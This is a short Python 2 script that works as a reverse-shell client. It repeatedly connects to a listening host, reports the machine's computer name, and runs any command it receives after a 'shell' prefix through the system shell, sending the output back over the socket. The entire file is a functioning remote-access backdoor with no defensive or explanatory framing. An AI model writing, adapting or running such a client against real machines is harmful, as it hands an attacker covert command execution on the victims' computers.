import socket,os,sys,subprocess
from time import sleep

class SocketClient():

    def sleeping(self, seconds = 5):
        if seconds == 0:
            sys.stdout.write('\r\n')
            sys.stdout.flush()
            return
        sys.stdout.write('\rwait..%s' % seconds)
        sys.stdout.flush()
        sleep(1)
        self.sleeping(seconds-1)

    def __init__(self,host = "",port = "4655", start=True):
        if host == '':
            self.host = raw_input('Type the host for listening')
        else:
            self.host = host
        self.port = int(port)
        os.system('cls')
        if start:
            self.connect()
            self.receive()
    def connect(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        success = False
        while not success:
            try:
                print "[!] Trying to connect to %s:%s" % (self.host,self.port)
                self.s.connect((self.host,self.port))
                print '[*] Connection established'
                self.s.send(os.environ['COMPUTERNAME'])
                success = True
            except Exception,e:
                print 'Could not connect' + str(e.message)
                self.sleeping()
    def receive(self):
        receive = self.s.recv(1024)
        print receive
        if receive == 'quit':
            self.s.close()
            sys.exit()
        elif receive[0:5] == 'shell':
            proc = subprocess.Popen(receive[5:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            returnValue = proc.stdout.read() + proc.stderr.read()
        else:
            returnValue = 'no valid input was given.'
        self.send(returnValue)
    def send(self,args):
        send = self.s.send(args)
        self.receive()


while True:
    try:
        socketClient = SocketClient('127.0.0.1')
    except socket.error as msg:
        print str(msg)